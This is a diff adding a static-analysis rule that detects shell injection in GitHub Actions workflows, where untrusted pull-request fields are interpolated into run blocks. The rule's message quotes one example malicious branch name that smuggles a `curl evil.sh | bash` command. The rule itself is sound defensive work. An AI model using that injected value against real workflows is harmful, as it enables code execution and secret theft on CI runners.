@@ -1,0 +1,63 @@
+rules:
+  - id: security.gha.run-shell-injection
+    languages:
+      - yaml
+    severity: ERROR
+    message: >
+      Untrusted GitHub context is interpolated directly into this `run`/`script`
+      block, where it is substituted into the command *before* the shell runs —
+      so quoting inside the script does not protect you. An attacker who controls
+      the value (e.g. a pull-request title, label, or fork branch name such as
+      `a"; curl evil.sh | bash; "`) can execute arbitrary commands on the runner
+      and steal secrets or code. Fix: copy the value into a step-level `env:`
+      entry (e.g. `TITLE: ${{ github.event.pull_request.title }}`) and reference
+      the quoted environment variable in the script instead (`echo "$TITLE"`),
+      which keeps the untrusted data out of command parsing. If the value appears
+      only as a *condition* choosing between hard-coded string literals (e.g.
+      `${{ github.head_ref == 'x' && 'a' || 'b' }}`) the result is constant and
+      not exploitable; still hoist it into bash so the `run` line carries no
+      `${{ }}`. Only inputs an external contributor can control without write
+      access are flagged.
+    paths:
+      include:
+        - .github/workflows/**
+        - "**/action.yml"
+        - "**/action.yaml"
+    patterns:
+      - pattern-either:
+          - pattern: "run: $CMD"
+          - pattern: "script: $CMD"
+      - metavariable-regex:
+          metavariable: $CMD
+          # Flags only externally (fork-PR) controllable, shell-injectable context.
+          # Intentionally NOT flagged here, by design:
+          #   - `github.workflow`: repo-defined, not attacker-controlled.
+          #   - charset-constrained identifiers that cannot carry shell metacharacters
+          #     (`*.login`, `github.actor`, `*.sha`, and `.name` on repository /
+          #     repo / organization — those names are [A-Za-z0-9._-] only, so the
+          #     `.name` match below is scoped to free-text owners).
+          #   - non-fork-controlled refs / branch names (`github.ref`, `base_ref`,
+          #     `ref_name`, `pull_request.base.ref`, and `*.default_branch`) —
+          #     write-access-gated, advisory only, see
+          #     `security.gha.run-shell-injection-refs`.
+          #   - caller-supplied `inputs.*` — advisory, see
+          #     `security.gha.run-shell-injection-inputs`.
+          # Matches both dot and bracket property access: `.x`, `['x']`, `["x"]`.
+          # `.name` is scoped to free-text owners (author/committer/pusher/label(s)/
+          # release/project[_column]) so it does NOT match charset-constrained
+          # `repository.name` / `repo.name` / `organization.name`.
+          regex: (?si).*\bgithub(?:\.head_ref\b|\[['"]head_ref['"]\]|(?:\.event\b|\[['"]event['"]\])(?:(?:\.inputs\b|\[['"]inputs['"]\])(?:\.[\w-]+|\[['"][\w-]+['"]\])|\.pull_request\.head\.ref\b|\.deployment\.ref\b|[\w.\[\]'"*-]*[.'"](?:title|body|message|description|note|page_name|email|label|head_branch)\b|[\w.\[\]'"*-]*\b(?:author|committer|pusher|labels?(?:\.\*|\[\d+\])?|release|project_column|project)(?:\.name\b|\[['"]name['"]\])))
+    metadata:
+      source: sast/opengrep/rules/gha-run-injection.yml
+      category: security
+      cwe:
+        - "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+      owasp:
+        - A03:2021 - Injection
+      technology:
+        - github-actions
+      confidence: HIGH
+      references:
+        - https://docs.github.com/en/actions/concepts/security/script-injections
+        - https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
+        - https://securitylab.github.com/resources/github-actions-untrusted-input/
